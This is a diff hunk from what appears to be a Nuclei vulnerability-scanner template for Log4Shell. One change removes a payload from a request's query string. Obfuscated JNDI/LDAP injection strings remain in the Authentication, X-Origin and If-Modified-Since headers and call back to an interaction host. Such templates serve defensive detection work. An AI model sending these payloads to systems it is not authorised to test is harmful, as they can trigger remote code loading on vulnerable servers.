@@ -95,7 +95,7 @@ requests:
         Authentication: Basic ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xauthenticationbasic.{{interactsh-url}}/(}
         
       - |
-        GET /api/?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
+        GET /api/?auth=1&res=js HTTP/1.1
         Host: {{Hostname}}
         X-Origin: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xxorigin.{{interactsh-url}}/(}
         If-Modified-Since: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xifmodifieds.{{interactsh-url}}/(}
